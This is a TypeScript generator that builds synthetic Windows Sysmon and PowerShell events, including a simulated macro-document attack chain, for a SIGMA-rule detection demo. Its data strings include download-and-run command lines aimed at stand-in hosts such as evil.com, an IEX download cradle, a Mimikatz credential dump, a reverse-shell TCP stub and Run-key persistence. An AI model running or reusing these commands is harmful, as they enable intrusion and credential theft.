/**
 * Sample Data Generator
 * Generates synthetic Windows events that match various SIGMA rules
 * for demonstration purposes
 */

import { LogEntry, ParsedData } from "../types";

// Suspicious process paths that trigger SIGMA rules
const SUSPICIOUS_PROCESSES = [
  {
    image: "C:\\Windows\\System32\\cmd.exe",
    parent: "C:\\Windows\\System32\\winword.exe",
    cmdLine: "cmd.exe /c whoami",
  },
  {
    image: "C:\\Windows\\System32\\powershell.exe",
    parent: "C:\\Windows\\System32\\cmd.exe",
    cmdLine: "powershell.exe -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIA",
  },
  {
    image: "C:\\Windows\\System32\\mshta.exe",
    parent: "C:\\Windows\\System32\\cmd.exe",
    cmdLine:
      'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell""")',
  },
  {
    image: "C:\\Windows\\System32\\certutil.exe",
    parent: "C:\\Windows\\System32\\cmd.exe",
    cmdLine:
      "certutil.exe -urlcache -split -f http://malicious.com/payload.exe",
  },
  {
    image: "C:\\Windows\\System32\\bitsadmin.exe",
    parent: "C:\\Windows\\System32\\cmd.exe",
    cmdLine:
      "bitsadmin /transfer job /download /priority high http://evil.com/mal.exe C:\\temp\\mal.exe",
  },
  {
    image: "C:\\Windows\\System32\\regsvr32.exe",
    parent: "C:\\Windows\\System32\\cmd.exe",
    cmdLine: "regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll",
  },
  {
    image: "C:\\Windows\\System32\\rundll32.exe",
    parent: "C:\\Windows\\System32\\explorer.exe",
    cmdLine: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
  },
  {
    image: "C:\\Windows\\System32\\wscript.exe",
    parent: "C:\\Windows\\System32\\explorer.exe",
    cmdLine: "wscript.exe C:\\Users\\Public\\malicious.vbs",
  },
  {
    image: "C:\\Windows\\System32\\cscript.exe",
    parent: "C:\\Windows\\System32\\cmd.exe",
    cmdLine: "cscript.exe //E:vbscript C:\\temp\\script.txt",
  },
  {
    image: "C:\\Users\\Public\\Downloads\\update.exe",
    parent: "C:\\Windows\\System32\\cmd.exe",
    cmdLine: "C:\\Users\\Public\\Downloads\\update.exe -silent",
  },
];

// Normal/benign processes
const NORMAL_PROCESSES = [
  {
    image: "C:\\Windows\\System32\\svchost.exe",
    parent: "C:\\Windows\\System32\\services.exe",
    cmdLine: "svchost.exe -k netsvcs -p",
  },
  {
    image: "C:\\Windows\\System32\\lsass.exe",
    parent: "C:\\Windows\\System32\\wininit.exe",
    cmdLine: "C:\\Windows\\System32\\lsass.exe",
  },
  {
    image: "C:\\Windows\\explorer.exe",
    parent: "C:\\Windows\\System32\\userinit.exe",
    cmdLine: "C:\\Windows\\explorer.exe",
  },
  {
    image: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    parent: "C:\\Windows\\explorer.exe",
    cmdLine: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"',
  },
  {
    image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    parent: "C:\\Windows\\explorer.exe",
    cmdLine:
      '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"',
  },
  {
    image: "C:\\Windows\\System32\\taskhostw.exe",
    parent: "C:\\Windows\\System32\\svchost.exe",
    cmdLine: "taskhostw.exe",
  },
  {
    image: "C:\\Windows\\System32\\conhost.exe",
    parent: "C:\\Windows\\System32\\cmd.exe",
    cmdLine: "conhost.exe 0xffffffff -ForceV1",
  },
  {
    image: "C:\\Windows\\System32\\notepad.exe",
    parent: "C:\\Windows\\explorer.exe",
    cmdLine: "notepad.exe C:\\Users\\user\\document.txt",
  },
];

// Network connection targets
const NETWORK_CONNECTIONS = [
  {
    destIp: "185.234.72.100",
    destPort: 443,
    destHostname: "c2-server.evil.com",
  },
  { destIp: "192.168.1.100", destPort: 445, destHostname: "fileserver.local" },
  { destIp: "8.8.8.8", destPort: 53, destHostname: "dns.google" },
  {
    destIp: "104.26.10.228",
    destPort: 80,
    destHostname: "suspicious-domain.xyz",
  },
];

// Registry keys that trigger rules
const REGISTRY_EVENTS = [
  {
    targetObject:
      "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
    details: "C:\\Users\\Public\\mal.exe",
  },
  {
    targetObject:
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update",
    details: "powershell.exe -enc ...",
  },
  {
    targetObject: "HKLM\\SYSTEM\\CurrentControlSet\\Services\\malicious_svc",
    details: "Service installed",
  },
];

// DNS queries
const DNS_QUERIES = [
  { queryName: "evil-c2-server.com", queryResults: "185.234.72.100" },
  { queryName: "pastebin.com", queryResults: "104.20.67.143" },
  { queryName: "raw.githubusercontent.com", queryResults: "185.199.108.133" },
  {
    queryName: "microsoftonline.com.suspicious.tk",
    queryResults: "192.168.1.50",
  },
];

// Users
const USERS = [
  "SYSTEM",
  "NT AUTHORITY\\SYSTEM",
  "WORKSTATION\\Administrator",
  "WORKSTATION\\user1",
  "WORKSTATION\\john.doe",
];

// Computer names
const COMPUTERS = ["WORKSTATION-01", "DESKTOP-ABC123", "SRV-DC01"];

/**
 * Generate a random date within the last 24 hours
 */
function randomRecentDate(): Date {
  const now = new Date();
  const hoursAgo = Math.random() * 24;
  return new Date(now.getTime() - hoursAgo * 60 * 60 * 1000);
}

/**
 * Generate a random GUID
 */
function randomGuid(): string {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

/**
 * Generate a Sysmon Event ID 1 (Process Creation) XML
 */
function generateProcessCreationEvent(
  proc: (typeof SUSPICIOUS_PROCESSES)[0],
  user: string,
  computer: string,
  timestamp: Date,
): string {
  const processId = Math.floor(Math.random() * 10000) + 1000;
  const parentProcessId = Math.floor(Math.random() * 5000) + 500;
  const processGuid = randomGuid();
  const parentProcessGuid = randomGuid();

  return `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>1</EventID>
    <Level>4</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${timestamp.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ProcessId">${processId}</Data>
    <Data Name="Image">${proc.image}</Data>
    <Data Name="CommandLine">${proc.cmdLine}</Data>
    <Data Name="ParentImage">${proc.parent}</Data>
    <Data Name="ParentProcessId">${parentProcessId}</Data>
    <Data Name="ParentCommandLine">${proc.parent}</Data>
    <Data Name="User">${user}</Data>
    <Data Name="ProcessGuid">{${processGuid}}</Data>
    <Data Name="ParentProcessGuid">{${parentProcessGuid}}</Data>
    <Data Name="OriginalFileName">${proc.image.split("\\").pop()}</Data>
    <Data Name="IntegrityLevel">High</Data>
  </EventData>
</Event>`;
}

/**
 * Generate a Sysmon Event ID 3 (Network Connection) XML
 */
function generateNetworkConnectionEvent(
  conn: (typeof NETWORK_CONNECTIONS)[0],
  proc: (typeof NORMAL_PROCESSES)[0],
  user: string,
  computer: string,
  timestamp: Date,
): string {
  const processId = Math.floor(Math.random() * 10000) + 1000;
  const sourcePort = Math.floor(Math.random() * 50000) + 10000;

  return `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>3</EventID>
    <Level>4</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${timestamp.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ProcessId">${processId}</Data>
    <Data Name="Image">${proc.image}</Data>
    <Data Name="User">${user}</Data>
    <Data Name="SourceIp">192.168.1.10</Data>
    <Data Name="SourcePort">${sourcePort}</Data>
    <Data Name="DestinationIp">${conn.destIp}</Data>
    <Data Name="DestinationPort">${conn.destPort}</Data>
    <Data Name="DestinationHostname">${conn.destHostname}</Data>
    <Data Name="Protocol">tcp</Data>
  </EventData>
</Event>`;
}

/**
 * Generate a Sysmon Event ID 12/13 (Registry Event) XML
 * @internal Reserved for future use
 */
// @ts-expect-error Reserved for future use
// eslint-disable-next-line @typescript-eslint/no-unused-vars
function _generateRegistryEvent(
  reg: (typeof REGISTRY_EVENTS)[0],
  proc: (typeof NORMAL_PROCESSES)[0],
  user: string,
  computer: string,
  timestamp: Date,
): string {
  const eventId = Math.random() > 0.5 ? 12 : 13;
  const processId = Math.floor(Math.random() * 10000) + 1000;

  return `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>${eventId}</EventID>
    <Level>4</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${timestamp.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ProcessId">${processId}</Data>
    <Data Name="Image">${proc.image}</Data>
    <Data Name="TargetObject">${reg.targetObject}</Data>
    <Data Name="Details">${reg.details}</Data>
    <Data Name="User">${user}</Data>
  </EventData>
</Event>`;
}

/**
 * Generate a Sysmon Event ID 22 (DNS Query) XML
 */
function generateDnsQueryEvent(
  dns: (typeof DNS_QUERIES)[0],
  proc: (typeof NORMAL_PROCESSES)[0],
  user: string,
  computer: string,
  timestamp: Date,
): string {
  const processId = Math.floor(Math.random() * 10000) + 1000;

  return `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>22</EventID>
    <Level>4</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${timestamp.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ProcessId">${processId}</Data>
    <Data Name="Image">${proc.image}</Data>
    <Data Name="QueryName">${dns.queryName}</Data>
    <Data Name="QueryResults">${dns.queryResults}</Data>
    <Data Name="User">${user}</Data>
  </EventData>
</Event>`;
}

/**
 * Generate a PowerShell Event ID 4104 (Script Block Logging) XML
 * @internal Reserved for future use
 */
// @ts-expect-error Reserved for future use
// eslint-disable-next-line @typescript-eslint/no-unused-vars
function _generatePowerShellEvent(computer: string, timestamp: Date): string {
  const scriptBlocks = [
    'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")',
    "Invoke-Mimikatz -DumpCreds",
    '[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.CSharp")',
    '$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444)',
    'Get-Process | Where-Object {$_.ProcessName -eq "lsass"} | Select-Object -First 1',
  ];

  const scriptBlock =
    scriptBlocks[Math.floor(Math.random() * scriptBlocks.length)];

  return `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"/>
    <EventID>4104</EventID>
    <Level>5</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${timestamp.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ScriptBlockText">${scriptBlock}</Data>
    <Data Name="ScriptBlockId">${randomGuid()}</Data>
    <Data Name="Path">C:\\Users\\user\\script.ps1</Data>
  </EventData>
</Event>`;
}

/**
 * Parse a generated XML event into a LogEntry
 */
function parseGeneratedEvent(xml: string): LogEntry {
  // Extract EventID
  const eventIdMatch = xml.match(/<EventID>(\d+)<\/EventID>/);
  const eventId = eventIdMatch ? parseInt(eventIdMatch[1]) : 0;

  // Extract timestamp
  const timeMatch = xml.match(/SystemTime="([^"]+)"/);
  const timestamp = timeMatch ? new Date(timeMatch[1]) : new Date();

  // Extract computer
  const computerMatch = xml.match(/<Computer>([^<]+)<\/Computer>/);
  const computer = computerMatch ? computerMatch[1] : "";

  // Extract level
  const levelMatch = xml.match(/<Level>(\d+)<\/Level>/);
  const levelNum = levelMatch ? parseInt(levelMatch[1]) : 4;
  const levelMap: Record<number, string> = {
    1: "Critical",
    2: "Error",
    3: "Warning",
    4: "Information",
    5: "Verbose",
  };
  const level = levelMap[levelNum] || "Information";

  // Extract provider/source
  const providerMatch = xml.match(/<Provider Name="([^"]+)"/);
  const source = providerMatch ? providerMatch[1] : "";

  // For demo purposes, surface the full Sysmon-style XML in the message column
  const message = xml;

  return {
    timestamp,
    ip: "",
    method: "",
    path: "",
    statusCode: 0,
    size: 0,
    rawLine: xml,
    eventId,
    level,
    source,
    computer,
    message,
  };
}

/**
 * Generate an attack chain with related events sharing ProcessGuid
 */
function generateAttackChain(baseTime: Date, computer: string): string[] {
  const events: string[] = [];
  const user = "WORKSTATION\\Administrator";

  // Create a shared ProcessGuid for the attack chain
  const explorerGuid = randomGuid();
  const wordGuid = randomGuid();
  const cmdGuid = randomGuid();
  const powershellGuid = randomGuid();

  // Event 1: Word opens (initial access)
  const t1 = new Date(baseTime.getTime());
  events.push(`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>1</EventID>
    <Level>4</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${t1.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ProcessId">4512</Data>
    <Data Name="Image">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
    <Data Name="CommandLine">"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\user\\invoice.docm"</Data>
    <Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
    <Data Name="ParentProcessId">1234</Data>
    <Data Name="User">${user}</Data>
    <Data Name="ProcessGuid">{${wordGuid}}</Data>
    <Data Name="ParentProcessGuid">{${explorerGuid}}</Data>
  </EventData>
</Event>`);

  // Event 2: Word spawns cmd.exe (execution)
  const t2 = new Date(baseTime.getTime() + 5000);
  events.push(`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>1</EventID>
    <Level>4</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${t2.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ProcessId">5678</Data>
    <Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c whoami</Data>
    <Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
    <Data Name="ParentProcessId">4512</Data>
    <Data Name="User">${user}</Data>
    <Data Name="ProcessGuid">{${cmdGuid}}</Data>
    <Data Name="ParentProcessGuid">{${wordGuid}}</Data>
  </EventData>
</Event>`);

  // Event 3: cmd spawns powershell (execution)
  const t3 = new Date(baseTime.getTime() + 8000);
  events.push(`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>1</EventID>
    <Level>4</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${t3.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ProcessId">6789</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAA=</Data>
    <Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="ParentProcessId">5678</Data>
    <Data Name="User">${user}</Data>
    <Data Name="ProcessGuid">{${powershellGuid}}</Data>
    <Data Name="ParentProcessGuid">{${cmdGuid}}</Data>
  </EventData>
</Event>`);

  // Event 4: PowerShell makes network connection (C2)
  const t4 = new Date(baseTime.getTime() + 12000);
  events.push(`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>3</EventID>
    <Level>4</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${t4.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ProcessId">6789</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="User">${user}</Data>
    <Data Name="SourceIp">192.168.1.10</Data>
    <Data Name="SourcePort">52341</Data>
    <Data Name="DestinationIp">185.234.72.100</Data>
    <Data Name="DestinationPort">443</Data>
    <Data Name="DestinationHostname">c2-server.evil.com</Data>
    <Data Name="ProcessGuid">{${powershellGuid}}</Data>
  </EventData>
</Event>`);

  // Event 5: Registry persistence (SUSPICIOUS - will trigger SIGMA rule)
  // This creates a Run key entry that is NOT in the filter list, so it will be detected
  const t5 = new Date(baseTime.getTime() + 15000);
  events.push(`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
    <EventID>13</EventID>
    <Level>4</Level>
    <Computer>${computer}</Computer>
    <TimeCreated SystemTime="${t5.toISOString()}"/>
  </System>
  <EventData>
    <Data Name="ProcessId">6789</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="TargetObject">HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SuspiciousUpdater</Data>
    <Data Name="Details">C:\\Users\\Public\\malicious_payload.exe -silent</Data>
    <Data Name="User">${user}</Data>
    <Data Name="ProcessGuid">{${powershellGuid}}</Data>
    <Data Name="EventType">SetValue</Data>
  </EventData>
</Event>`);

  return events;
}

/**
 * Generate sample Windows event data
 */
export function generateSampleData(): ParsedData {
  const entries: LogEntry[] = [];
  const computer = COMPUTERS[0];

  // Generate 2-3 attack chains with correlated events
  const now = new Date();
  const chain1Time = new Date(now.getTime() - 2 * 60 * 60 * 1000); // 2 hours ago
  const chain2Time = new Date(now.getTime() - 1 * 60 * 60 * 1000); // 1 hour ago

  // Attack chain 1: Macro document execution
  const chain1Events = generateAttackChain(chain1Time, computer);
  chain1Events.forEach((xml) => entries.push(parseGeneratedEvent(xml)));

  // Attack chain 2: Different attack on different computer
  const chain2Events = generateAttackChain(chain2Time, COMPUTERS[1]);
  chain2Events.forEach((xml) => entries.push(parseGeneratedEvent(xml)));

  // Add background noise - normal activity
  for (let i = 0; i < 50; i++) {
    const timestamp = randomRecentDate();
    const user = USERS[Math.floor(Math.random() * USERS.length)];
    const comp = COMPUTERS[Math.floor(Math.random() * COMPUTERS.length)];

    let xml: string;
    const eventType = Math.random();

    if (eventType < 0.5) {
      // Normal process events
      const proc =
        NORMAL_PROCESSES[Math.floor(Math.random() * NORMAL_PROCESSES.length)];
      xml = generateProcessCreationEvent(proc, user, comp, timestamp);
    } else if (eventType < 0.7) {
      // Network events
      const conn =
        NETWORK_CONNECTIONS[
          Math.floor(Math.random() * NETWORK_CONNECTIONS.length)
        ];
      const proc =
        NORMAL_PROCESSES[Math.floor(Math.random() * NORMAL_PROCESSES.length)];
      xml = generateNetworkConnectionEvent(conn, proc, user, comp, timestamp);
    } else if (eventType < 0.85) {
      // DNS events
      const dns = DNS_QUERIES[Math.floor(Math.random() * DNS_QUERIES.length)];
      const proc =
        NORMAL_PROCESSES[Math.floor(Math.random() * NORMAL_PROCESSES.length)];
      xml = generateDnsQueryEvent(dns, proc, user, comp, timestamp);
    } else {
      // Some additional suspicious processes scattered
      const proc =
        SUSPICIOUS_PROCESSES[
          Math.floor(Math.random() * SUSPICIOUS_PROCESSES.length)
        ];
      xml = generateProcessCreationEvent(proc, user, comp, timestamp);
    }

    entries.push(parseGeneratedEvent(xml));
  }

  // Add a few more isolated suspicious events
  for (let i = 0; i < 10; i++) {
    const timestamp = randomRecentDate();
    const user = USERS[Math.floor(Math.random() * USERS.length)];
    const comp = COMPUTERS[Math.floor(Math.random() * COMPUTERS.length)];
    const proc =
      SUSPICIOUS_PROCESSES[
        Math.floor(Math.random() * SUSPICIOUS_PROCESSES.length)
      ];
    entries.push(
      parseGeneratedEvent(
        generateProcessCreationEvent(proc, user, comp, timestamp),
      ),
    );
  }

  // Sort by timestamp
  entries.sort((a, b) => a.timestamp.getTime() - b.timestamp.getTime());

  return {
    entries,
    format: "evtx",
    platform: "windows",
    totalLines: entries.length,
    parsedLines: entries.length,
  };
}
